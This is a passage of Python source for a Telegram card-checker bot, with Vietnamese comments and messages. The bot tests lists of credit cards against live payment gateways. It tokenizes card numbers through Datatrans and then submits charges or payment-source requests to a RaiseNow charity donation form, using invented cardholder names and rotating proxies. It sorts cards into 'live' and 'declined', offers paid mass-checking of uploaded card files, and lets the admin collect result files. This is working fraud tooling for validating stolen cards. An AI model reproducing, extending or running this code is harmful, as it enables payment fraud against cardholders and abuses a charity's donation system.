            "Referer": "https://donate.raisenow.io/", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache", "Accept": "*/*"
        }

        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Payment Source: {error}", bin_info
        if not payment_response: return 'error', line, "L·ªói HTTP kh√¥ng c√≥ ph·∫£n h·ªìi khi Payment Source", bin_info

        response_text = payment_response.text

        if '{"message":"Forbidden"}' in response_text:
            return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info

        # Th·∫ª Live/Approved khi API y√™u c·∫ßu x√°c th·ª±c 3DS.
        if '"payment_source_status":"pending"' in response_text:
            return 'live_success', line, response_text, bin_info
        
        # B·∫•t k·ª≥ tr∆∞·ªùng h·ª£p n√†o kh√°c kh√¥ng ph·∫£i 'pending' s·∫Ω ƒë∆∞·ª£c coi l√† Decline.
        else:
            return 'decline', line, response_text, bin_info

    except Exception as e:
        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh trong Gate 7 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L·ªói h·ªá th·ªëng Gate 7: {e}", bin_info

# <<<--- C·∫¨P NH·∫¨T: LOGIC M·ªöI CHO GATE 8 ---<<<
def _check_card_gate8(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount=None):
    """Logic cho Gate 8 - Ch·∫ø ƒë·ªô Charge ho·∫∑c Check Live"""
    gate8_mode = get_gate8_mode()

    try:
        # Generate random names
        random_first_name = generate_random_name(random.randint(4, 8))
        random_last_name = generate_random_name(random.randint(4, 8))
        random_cardholder = f"{random_first_name} {random_last_name}"
        
        # Step 1: Tokenize card (chung cho c·∫£ 2 ch·∫ø ƒë·ªô)
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250804202812044270", # Gate 8 formId
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
            "merchantId": "3000022877",
            "browserUserAgent": ua,
            "browserJavaEnabled": "false",
            "browserLanguage": "vi-VN",
            "browserColorDepth": "24",
            "browserScreenHeight": "1152",
            "browserScreenWidth": "2048",
            "browserTZ": "-420"
        }
        tokenize_headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": ua
        }

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Tokenize: {error}", bin_info
        if not token_response: return 'error', line, "L·ªói HTTP kh√¥ng c√≥ ph·∫£n h·ªìi khi Tokenize", bin_info

        try:
            token_data = token_response.json()
            if "error" in token_data and token_data.get("error") == "Invalid cardNumber":
                return 'decline', line, 'INVALID_CARDNUMBER_DECLINE', bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", {}).get("message", "Unknown error at Tokenize"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"L·ªói HTTP {token_response.status_code} khi Tokenize", bin_info
            return 'error', line, "Ph·∫£n h·ªìi Tokenize kh√¥ng ph·∫£i JSON", bin_info

        # Step 2: Request d·ª±a tr√™n mode
        # --- CHARGE MODE ---
        if gate8_mode == 'charge':
            charge_value = _get_charge_value('8', custom_charge_amount) # L·∫•y charge value cho gate 8
            payment_url = "https://api.raisenow.io/payments" # Endpoint charge
            payment_payload = {
                "account_uuid": "ca1e7e48-d2ed-4d3c-aa7e-df7e93582adf",
                "test_mode": False,
                "create_supporter": False,
                "amount": {"currency": "EUR", "value": charge_value}, # S·ª≠ d·ª•ng charge_value
                "supporter": {
                    "locale": "de",
                    "first_name": random_first_name,
                    "last_name": random_last_name,
                    "email_permission": False,
                    "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}
                },
                "raisenow_parameters": {
                    "analytics": { "channel": "paylink", "suggested_amounts": [], "user_agent": ua },
                    "solution": { "uuid": "e0c23079-8884-47ea-b529-1dda7b164400", "name": "Trauerspenden", "type": "donate" },
                    "product": { "name": "tamaro", "source_url": "https://donate.raisenow.io/mpnfg?lng=de", "uuid": "self-service", "version": "2.16.0" },
                    "integration": {"message": "efwwef"}
                },
                "custom_parameters": { "campaign_id": "trauerspende", "campaign_subid": "" },
                "payment_information": { "brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id },
                "profile": "15e9c847-fead-46e8-ab17-45c23a8ca9d4",
                "return_url": "https://donate.raisenow.io/mpnfg?lng=de&rnw-view=payment_result"
            }
            payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": ua }

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Payment: {error}", bin_info
            
            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            
            # Logic ph·∫£n h·ªìi charge gi·ªëng Gate 6
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

        # --- LIVE CHECK MODE (Original Logic) ---
        else: # gate8_mode == 'live'
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload = {
                "account_uuid": "ca1e7e48-d2ed-4d3c-aa7e-df7e93582adf",
                "test_mode": False,
                "create_supporter": False,
                "amount": {"currency": "EUR", "value": 50},
                "supporter": { "locale": "de", "first_name": random_first_name, "last_name": random_last_name, "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}} },
                "raisenow_parameters": {
                    "analytics": { "channel": "paylink", "suggested_amounts": [], "user_agent": ua },
                    "solution": { "uuid": "e0c23079-8884-47ea-b529-1dda7b164400", "name": "Trauerspenden", "type": "donate" },
                    "product": { "name": "tamaro", "source_url": "https://donate.raisenow.io/mpnfg?lng=de", "uuid": "self-service", "version": "2.16.0" },
                    "integration": {"message": "efwwef"}
                },
                "custom_parameters": { "campaign_id": "trauerspende", "campaign_subid": "" },
                "payment_information": { "brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id },
                "profile": "15e9c847-fead-46e8-ab17-45c23a8ca9d4",
                "return_url": "https://donate.raisenow.io/mpnfg?lng=de&rnw-view=payment_result"
            }
            payment_headers = { "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": ua }

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói Payment Source: {error}", bin_info
            if not payment_response: return 'error', line, "L·ªói HTTP kh√¥ng c√≥ ph·∫£n h·ªìi khi Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            else: return 'decline', line, response_text, bin_info

    except Exception as e:
        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh trong Gate 8 cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L·ªói h·ªá th·ªëng Gate 8: {e}", bin_info

def check_card(line, cancellation_event=None, custom_charge_amount=None):
    if cancellation_event and cancellation_event.is_set():
        return 'cancelled', line, 'User cancelled', {}

    parts = line.strip().split('|')
    cc, mes, ano, cvv = "", "", "", ""

    if len(parts) == 4:
        cc, mes, ano, cvv = [p.strip() for p in parts]
    elif len(parts) == 3:
        cc_part, date_part, cvv_part = [p.strip() for p in parts]
        if '/' in date_part:
            date_split = date_part.split('/')
            if len(date_split) == 2:
                cc, mes, ano, cvv = cc_part.strip(), date_split[0].strip(), date_split[1].strip(), cvv_part.strip()
            else:
                return 'invalid_format', line, "ƒê·ªãnh d·∫°ng ng√†y th√°ng kh√¥ng h·ª£p l·ªá (mm/yy ho·∫∑c mm/yyyy).", {}
        else:
            return 'invalid_format', line, "Thi·∫øu d·∫•u '/' trong ph·∫ßn ng√†y th√°ng.", {}
    else:
        return 'invalid_format', line, "ƒê·ªãnh d·∫°ng kh√¥ng h·ª£p l·ªá (cc|mm|yy|cvv ho·∫∑c cc|mm/yy|cvv).", {}

    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid:
        return 'invalid_format', line, error_message, {}

    try:
        year_str = ano.strip()
        if len(year_str) == 2:
            full_year = int(f"20{year_str}")
        elif len(year_str) == 4:
            full_year = int(year_str)
        else:
            full_year = 0 
        if full_year < datetime.now().year:
            return 'decline', line, 'EXPIRED_CARD_DECLINE', {}
    except ValueError:
        return 'invalid_format', line, "NƒÉm h·∫øt h·∫°n kh√¥ng h·ª£p l·ªá.", {}

    if len(ano) == 2: ano = f"20{ano}"
    
    # C·∫¨P NH·∫¨T: LOGIC S·ª¨ D·ª§NG PROXY
    session = requests.Session()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    session.headers.update({"User-Agent": ua})

    proxy_config = load_proxies()
    if proxy_config.get("enabled") and proxy_config.get("proxies"):
        try:
            proxy_str = random.choice(proxy_config["proxies"])
            proxy_dict = _format_proxy_for_requests(proxy_str)
            if proxy_dict:
                session.proxies = proxy_dict
        except IndexError:
            logger.warning("Danh s√°ch proxy tr·ªëng nh∆∞ng proxy ƒëang ƒë∆∞·ª£c b·∫≠t.")
            pass # Kh√¥ng c√≥ proxy n√†o ƒë·ªÉ s·ª≠ d·ª•ng

    # --- K·∫æT TH√öC C·∫¨P NH·∫¨T ---
    
    bin_info = {}

    try:
        bin_to_check = cc[:6]
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        bin_headers = {"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}
        bin_response, error = make_request_with_retry(session, 'get', bin_url, headers=bin_headers, timeout=10, cancellation_event=cancellation_event)
        
        if error:
            return 'cancelled' if "cancelled" in error else 'error', line, f"L·ªói ki·ªÉm tra BIN: {error}", {}
        
        if bin_response:
            response_text_lower = bin_response.text.lower()
            if "not found" in response_text_lower and ('"detail":' in response_text_lower or bin_response.status_code != 200):
                return 'decline', line, 'INVALID_BIN_DECLINE', {}
            
            if bin_response.status_code == 200:
                try:
                    data = bin_response.json()
                    if isinstance(data, dict):
                        bin_info.update(data)
                    else:
                        logger.warning(f"API BIN tr·∫£ v·ªÅ d·ªØ li·ªáu kh√¥ng ph·∫£i dictionary cho BIN {bin_to_check}: {data}")
                except json.JSONDecodeError:
                    logger.warning(f"L·ªói ph√¢n t√≠ch JSON t·ª´ BIN check cho BIN {bin_to_check}")

        country_name_str = bin_info.get('country_name') or ''
        if country_name_str.upper() == 'VIETNAM':
            return 'decline', line, 'VIETNAM_BIN_DECLINE', bin_info
        
        active_gate = get_active_gate()
        
        # <<<--- C·∫¨P NH·∫¨T: TH√äM GATE 8 ---<<<
        gate_functions = {
            '1': _check_card_gate1,
            '2': _check_card_gate2,
            '3': _check_card_gate3,
            '4': _check_card_gate4,
            '5': _check_card_gate5,
            '6': _check_card_gate6,
            '7': _check_card_gate7,
            '8': _check_card_gate8,
        }
        
        gate_func = gate_functions.get(active_gate, _check_card_gate1) # M·∫∑c ƒë·ªãnh v·ªÅ gate 1
        return gate_func(session, line, cc, mes, ano, cvv, bin_info, ua, cancellation_event, custom_charge_amount)

    except Exception as e:
        logger.error(f"L·ªói kh√¥ng x√°c ƒë·ªãnh trong check_card cho line '{line}': {e}", exc_info=True)
        return 'error', line, f"L·ªói h·ªá th·ªëng kh√¥ng x√°c ƒë·ªãnh: {e}", bin_info

def create_progress_bar(current, total, length=10):
    if total == 0: return "[‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë‚ñë] 0%"
    fraction = current / total
    filled_len = int(length * fraction)
    bar = '‚ñà' * filled_len + '‚ñë' * (length - filled_len)
    return f"[{bar}] {int(fraction * 100)}%"

def get_flag_emoji(country_code):
    if not country_code or len(country_code) != 2: return ''
    try:
        return ''.join(chr(0x1F1E6 + ord(char.upper()) - ord('A')) for char in country_code)
    except Exception:
        return ''

# --- L·ªÜNH BOT ---
async def start(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id) or 'en' 

    if user.id in load_users() or user.id == ADMIN_ID:
        if lang == 'vi':
            await update.message.reply_text(f"**Ch√†o m·ª´ng tr·ªü l·∫°i, {user.first_name}!**\nD√πng /help ƒë·ªÉ xem c√°c l·ªánh b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng.")
        else:
            await update.message.reply_text(f"**Welcome back, {user.first_name}!**\nUse /help to see the available commands.")
    else:
        welcome_message = (
            "**Welcome to the Premium Card Checker Bot!** ü§ñ\n\n"
            "This bot utilizes a powerful `Charge Api Auth` to provide accurate card checking services.\n\n"
            "**Your current status:** `GUEST`\n"
            f"Your Telegram ID: `{user.id}`\n\n"
            "**üåü Upgrade to Premium! üåü**\n"
            "Unlock the full potential of the bot with a Premium membership:\n"
            "‚úÖ **Unlimited Checking:** No restrictions on the number of cards you can check.\n"
            "‚úÖ **Priority Support:** Get faster assistance from the admin.\n\n"
            f"To get access and upgrade to Premium, please contact the admin with your ID: {ADMIN_USERNAME}"
        )
        await update.message.reply_text(welcome_message)

async def info(update, context):
    await update.message.reply_text(f"üÜî ID Telegram c·ªßa b·∫°n l√†: `{update.effective_user.id}`")

async def get_help_text(user: User, lang_code: str):
    user_id = user.id
    user_mass_limit = get_user_limit(user_id)
    user_multi_limit = get_user_multi_limit(user_id)

    active_gate = get_active_gate()
    active_gate_name = get_formatted_gate_name(active_gate)
    gate_status_line_vi = f"\n‚ÑπÔ∏è **C·ªïng check th·∫ª hi·ªán t·∫°i:** `{active_gate_name}`"
    gate_status_line_en = f"\n‚ÑπÔ∏è **Current Card Check Gate:** `{active_gate_name}`"
    
    new_commands_vi = (
        "\n**Ki·ªÉm tra Website:**\n"
        "üîπ `/site <website.com>`\n"
        "   - *M√¥ t·∫£:* Ki·ªÉm tra th√¥ng tin m·ªôt website (Gateway, Captcha, etc.).\n\n"
        "üîπ `/sitem`\n"
        "   - *M√¥ t·∫£:* Ki·ªÉm tra nhi·ªÅu website c√πng l√∫c (t·ªëi ƒëa 10).\n"
    )
    new_commands_en = (
        "\n**Website Checker:**\n"
        "üîπ `/site <website.com>`\n"
        "   - *Description:* Checks a single website's info (Gateway, Captcha, etc.).\n\n"
        "üîπ `/sitem`\n"
        "   - *Description:* Checks multiple websites at once (max 10).\n"
    )

    text_vi = {
        "public": (
            "**B·∫£ng L·ªánh C√¥ng Khai** üõ†Ô∏è\n"
            "Ch√†o m·ª´ng b·∫°n! D∆∞·ªõi ƒë√¢y l√† c√°c l·ªánh c∆° b·∫£n b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng:\n\n"
            "üîπ `/start`\n"
            "   - *M√¥ t·∫£:* Kh·ªüi ƒë·ªông bot v√† nh·∫≠n ID Telegram c·ªßa b·∫°n.\n\n"
            "üîπ `/info`\n"
            "   - *M√¥ t·∫£:* L·∫•y l·∫°i ID Telegram c·ªßa b·∫°n m·ªôt c√°ch nhanh ch√≥ng.\n\n"
            "üîπ `/help`\n"
            "   - *M√¥ t·∫£:* Hi·ªÉn th·ªã b·∫£ng tr·ª£ gi√∫p n√†y.\n\n"
            f"**N√¢ng c·∫•p Premium:**\nƒê·ªÉ s·ª≠ d·ª•ng c√°c t√≠nh nƒÉng check kh√¥ng gi·ªõi h·∫°n, vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**B·∫£ng L·ªánh Th√†nh Vi√™n** üë§\n"
            "B·∫°n ƒë√£ ƒë∆∞·ª£c c·∫•p quy·ªÅn! S·ª≠ d·ª•ng c√°c l·ªánh sau:\n\n"
            "**Ki·ªÉm tra Th·∫ª:**\n"
            "üîπ `/cs <th·∫ª>`\n"
            "   - *M√¥ t·∫£:* Ki·ªÉm tra m·ªôt th·∫ª t√≠n d·ª•ng duy nh·∫•t.\n\n"
            "üîπ `/bin <bin>`\n"
            "   - *M√¥ t·∫£:* L·∫•y th√¥ng tin c·ªßa m·ªôt ƒë·∫ßu s·ªë th·∫ª (BIN).\n\n"
            "üîπ `/multi`\n"
            f"   - *M√¥ t·∫£:* Ki·ªÉm tra nhi·ªÅu th·∫ª trong m·ªôt tin nh·∫Øn (t·ªëi ƒëa {user_multi_limit} th·∫ª).\n\n"
            "üîπ `/mass<s·ªë lu·ªìng>`\n"
            "   - *M√¥ t·∫£:* Ki·ªÉm tra h√†ng lo·∫°t th·∫ª t·ª´ m·ªôt t·ªáp `.txt`.\n\n"
            "üîπ `/stop`\n"
            "   - *M√¥ t·∫£:* D·ª´ng t√°c v·ª• `/mass` ho·∫∑c `/multi` ƒëang ch·∫°y c·ªßa b·∫°n.\n"
            f"{new_commands_vi}\n"
            f"üí≥ **H·∫°n m·ª©c /mass:** `{user_mass_limit}` lines/file.\n"
            f"üåü **N√¢ng c·∫•p Premium:** Li√™n h·ªá {ADMIN_USERNAME} ƒë·ªÉ check kh√¥ng gi·ªõi h·∫°n."
        )
    }
    
    text_en = {
        "public": (
            "**Public Command Menu** üõ†Ô∏è\n"
            "Welcome! Here are the basic commands you can use:\n\n"
            "üîπ `/start`\n"
            "   - *Description:* Starts the bot and gets your Telegram ID.\n\n"
            "üîπ `/info`\n"
            "   - *Description:* Quickly retrieves your Telegram ID again.\n\n"
            "üîπ `/help`\n"
            "   - *Description:* Displays this help menu.\n\n"
            f"**Upgrade to Premium:**\nTo use unlimited checking features, please contact the Admin: {ADMIN_USERNAME}"
        ),
        "member": (
            "**Member Command Menu** üë§\n"
            "You are authorized! Use these commands:\n\n"
            "**Card Checker:**\n"
            "üîπ `/cs <card>`\n"
            "   - *Description:* Checks a single credit card.\n\n"
            "üîπ `/bin <bin>`\n"
            "   - *Description:* Retrieves information for a card's BIN.\n\n"
            "üîπ `/multi`\n"
            f"   - *Description:* Checks multiple cards in one message (max {user_multi_limit} cards).\n\n"
            "üîπ `/mass<threads>`\n"
            "   - *Description:* Checks a list of cards from a `.txt` file.\n\n"
            "üîπ `/stop`\n"
            "   - *Description:* Stops your currently running /mass or /multi task.\n"
            f"{new_commands_en}\n"
            f"üí≥ **/mass Limit:** `{user_mass_limit}` lines/file.\n"
            f"üåü **Upgrade to Premium:** Contact {ADMIN_USERNAME} for unlimited checking."
        )
    }

    admin_commands = (
        "**B·∫£ng L·ªánh Qu·∫£n Tr·ªã Vi√™n** üëë\n"
        "To√†n quy·ªÅn qu·∫£n l√Ω bot v·ªõi c√°c l·ªánh sau:\n\n"
        "**Qu·∫£n l√Ω Bot & Check:**\n"
        "üîπ `/on`, `/off` - B·∫≠t/T·∫Øt bot.\n"
        "üîπ `/status` - Ki·ªÉm tra tr·∫°ng th√°i c√°c c·ªïng check.\n"
        "üîπ `/gate [1-8]` - ƒê·ªïi c·ªïng check.\n"
        "üîπ `/setgate <id> <min> <max>` - ƒê·∫∑t kho·∫£ng charge cho c·ªïng.\n"
        "üîπ `/stop <user_id>` - D·ª´ng task c·ªßa user.\n"
        "üîπ `/cs<amount> <card>` - Check v·ªõi s·ªë ti·ªÅn charge t√πy ch·ªânh.\n\n"
        "**Qu·∫£n l√Ω Proxy:**\n"
        "üîπ `/onprx`, `/offprx` - B·∫≠t/T·∫Øt s·ª≠ d·ª•ng proxy.\n"
        "üîπ `/addprx <proxy>` - Th√™m v√† ki·ªÉm tra proxy m·ªõi.\n"
        "üîπ `/deleteprx` - Xem v√† x√≥a proxy hi·ªán c√≥.\n"
        "üîπ `/testprx` - Ki·ªÉm tra c√°c proxy ƒë√£ l∆∞u.\n\n"
        "**Qu·∫£n l√Ω User & Tin nh·∫Øn:**\n"
        "üîπ `/add <user_id>`\n"
        "üîπ `/ban <user_id>`\n"
        "üîπ `/show` - Xem danh s√°ch user.\n"
        "üîπ `/send <user_id> <tin_nh·∫Øn>`\n"
        "üîπ `/sendall <tin_nh·∫Øn>`\n\n"
        "**Qu·∫£n l√Ω Gi·ªõi h·∫°n:**\n"
        "üîπ `/addlimit <user_id> <s·ªë>`\n"
        "üîπ `/addlimitmulti <user_id> <s·ªë>`\n\n"
        "**Gi√°m s√°t & L·ªãch s·ª≠:**\n"
        "üîπ `/active` - Xem c√°c t√°c v·ª• ƒëang ch·∫°y.\n"
        "üîπ `/showcheck` - Xem th·ªëng k√™ check.\n"
        "üîπ `/lootfile <user_id>` - L·∫•y l·∫°i file k·∫øt qu·∫£."
    )

    lang_texts = text_vi if lang_code == 'vi' else text_en
    gate_status_line = gate_status_line_vi if lang_code == 'vi' else gate_status_line_en
    
    if user_id == ADMIN_ID:
        return f"{admin_commands}{gate_status_line_vi}\n\n{text_vi['member'].split('üí≥ **H·∫°n m·ª©c /mass:**')[0].strip()}"
    elif user_id in load_users():
        return f"{lang_texts['member']}{gate_status_line}"
    else:
        return lang_texts['public']

async def help_command(update, context):
    user = update.effective_user
    lang = get_user_lang(user.id)

    if not lang:
        keyboard = [
            [
                InlineKeyboardButton("üáªüá≥ Ti·∫øng Vi·ªát", callback_data="setlang_vi"),
                InlineKeyboardButton("üá¨üáß English", callback_data="setlang_en"),
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Vui l√≤ng ch·ªçn ng√¥n ng·ªØ c·ªßa b·∫°n / Please select your language:",
            reply_markup=reply_markup
        )
    else:
        help_text = await get_help_text(user, lang)
        await update.message.reply_text(help_text, disable_web_page_preview=True)

async def add_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("C√∫ ph√°p: `/add <user_id>`"); return
    try:
        user_to_add = int(context.args[0]); users = load_users()
        if user_to_add in users:
            await update.message.reply_text(f"‚ÑπÔ∏è Ng∆∞·ªùi d√πng `{user_to_add}` ƒë√£ c√≥ trong danh s√°ch.")
        else:
            users.add(user_to_add); save_users(users)
            await update.message.reply_text(f"‚úÖ ƒê√£ th√™m ng∆∞·ªùi d√πng `{user_to_add}`.")
    except ValueError: await update.message.reply_text("‚ùå User ID kh√¥ng h·ª£p l·ªá.")

async def ban_user(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args: await update.message.reply_text("C√∫ ph√°p: `/ban <user_id>`"); return
    try:
        user_to_ban = int(context.args[0]); users = load_users()
        if user_to_ban in users:
            users.discard(user_to_ban); save_users(users)
            user_log_dir = os.path.join(LOG_DIR, str(user_to_ban))
            if os.path.exists(user_log_dir):
                shutil.rmtree(user_log_dir)
            await update.message.reply_text(f"üóë ƒê√£ x√≥a ng∆∞·ªùi d√πng `{user_to_ban}` v√† to√†n b·ªô log.")
        else:
            await update.message.reply_text(f"‚ÑπÔ∏è Kh√¥ng t√¨m th·∫•y ng∆∞·ªùi d√πng `{user_to_ban}`.")
    except ValueError: await update.message.reply_text("‚ùå User ID kh√¥ng h·ª£p l·ªá.")

async def show_users(update, context):
    if update.effective_user.id != ADMIN_ID: return
    users = load_users()
    if not users:
        await update.message.reply_text("üì≠ Danh s√°ch ng∆∞·ªùi d√πng tr·ªëng."); return
    
    message_lines = ["üë• **Danh s√°ch ID & H·∫°n m·ª©c:**\n"]
    for user_id in sorted(list(users)):
        limit_mass = get_user_limit(user_id)
        limit_multi = get_user_multi_limit(user_id)
        message_lines.append(f"- `{user_id}` | Mass: `{limit_mass}` | Multi: `{limit_multi}`")
        
    await update.message.reply_text("\n".join(message_lines))

async def add_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("C√∫ ph√°p: `/addlimit <user_id> <s·ªë_d√≤ng_th√™m>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá. H√£y ch·∫Øc ch·∫Øn ID v√† s·ªë l∆∞·ª£ng l√† s·ªë."); return

    limits = load_json_file(LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MEMBER_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(LIMIT_FILE, limits)
    
    await update.message.reply_text(f"‚úÖ **C·∫≠p nh·∫≠t gi·ªõi h·∫°n /mass th√†nh c√¥ng!**\n\n"
                                      f"üë§ **User ID:** `{target_user_id_str}`\n"
                                      f"üìà **Gi·ªõi h·∫°n c≈©:** `{old_limit}`\n"
                                      f"‚ûï **ƒê√£ th√™m:** `{amount_to_add}`\n"
                                      f"üìä **T·ªïng m·ªõi:** `{new_limit}`")

async def add_multi_limit_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 2:
        await update.message.reply_text("C√∫ ph√°p: `/addlimitmulti <user_id> <s·ªë_th·∫ª_th√™m>`"); return
    try:
        target_user_id_str, amount_to_add_str = context.args
        amount_to_add = int(amount_to_add_str)
        if not target_user_id_str.isdigit() or amount_to_add <= 0:
            raise ValueError
    except (ValueError, IndexError):
        await update.message.reply_text("‚ùå D·ªØ li·ªáu kh√¥ng h·ª£p l·ªá. H√£y ch·∫Øc ch·∫Øn ID v√† s·ªë l∆∞·ª£ng l√† s·ªë."); return

    limits = load_json_file(MULTI_LIMIT_FILE)
    old_limit = int(limits.get(target_user_id_str, DEFAULT_MULTI_LIMIT))
    new_limit = old_limit + amount_to_add
    limits[target_user_id_str] = new_limit
    save_json_file(MULTI_LIMIT_FILE, limits)
    
    await update.message.reply_text(f"‚úÖ **C·∫≠p nh·∫≠t gi·ªõi h·∫°n /multi th√†nh c√¥ng!**\n\n"
                                      f"üë§ **User ID:** `{target_user_id_str}`\n"
                                      f"üìà **Gi·ªõi h·∫°n c≈©:** `{old_limit}`\n"
                                      f"‚ûï **ƒê√£ th√™m:** `{amount_to_add}`\n"
                                      f"üìä **T·ªïng m·ªõi:** `{new_limit}`")

async def bin_command(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"B·∫°n kh√¥ng ƒë∆∞·ª£c ph√©p s·ª≠ d·ª•ng l·ªánh n√†y. Vui l√≤ng li√™n h·ªá Admin: {ADMIN_USERNAME}")
        return

    if not context.args or not context.args[0].isdigit() or not (6 <= len(context.args[0]) <= 8):
        await update.message.reply_text("Vui l√≤ng cung c·∫•p m·ªôt BIN h·ª£p l·ªá (6-8 ch·ªØ s·ªë).\nS·ª≠ d·ª•ng: `/bin <bin_number>`")
        return
    
    bin_to_check = context.args[0]
    msg = await update.message.reply_text(f"‚è≥ ƒêang ki·ªÉm tra BIN `{bin_to_check}`...")

    try:
        session = requests.Session()
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        session.headers.update({"User-Agent": ua})
        
        bin_url = "https://bins.antipublic.cc/bins/" + bin_to_check
        bin_response, error = make_request_with_retry(session, 'get', bin_url, timeout=10)

        if error or not bin_response or bin_response.status_code != 200 or "not found" in bin_response.text.lower():
            await msg.edit_text(f"‚ùå Kh√¥ng t√¨m th·∫•y th√¥ng tin cho BIN `{bin_to_check}`."); return

        bin_info = bin_response.json()

        brand = (bin_info.get('brand') or 'N/A').upper()
        card_type = (bin_info.get('type') or 'N/A').upper()
        level = (bin_info.get('level') or 'N/A').upper()
        bank = bin_info.get('bank') or 'None'
        country_name = (bin_info.get('country_name') or 'N/A').upper()
        country_code = bin_info.get('country_code')
        flag = get_flag_emoji(country_code)

        bin_info_parts = [p for p in [brand, card_type, level] if p and p != 'N/A']
        bin_info_line = " ‚Äì ".join(bin_info_parts)
        
        response_text = (
            f"üÜî **BIN:** {bin_info_line}\n"
            f"üèõÔ∏è **Bank:** {bank}\n"
            f"üåê **Country:** {country_name} {flag}"
        )

        final_message = f"‚ÑπÔ∏è **BIN Info:** `{bin_to_check}`\n\n{response_text}"
        await msg.edit_text(final_message)

    except json.JSONDecodeError:
        await msg.edit_text(f"‚ùå L·ªói khi ph√¢n t√≠ch d·ªØ li·ªáu t·ª´ API cho BIN `{bin_to_check}`.")
    except Exception as e:
        logger.error(f"L·ªói trong /bin: {e}", exc_info=True)
        await msg.edit_text(f"‚õîÔ∏è **L·ªói H·ªá Th·ªëng:** `{e}`")

async def _process_single_check(update, context, line, custom_charge_amount=None):
    """H√†m x·ª≠ l√Ω logic check cho c·∫£ /cs v√† /cs<amount>"""
    msg = await update.message.reply_text("‚è≥ *Checking your card, please wait...*")
    start_time = time.time()
    try:
        status, original_line, full_response, bin_info = await asyncio.to_thread(
            check_card, line, custom_charge_amount=custom_charge_amount
        )
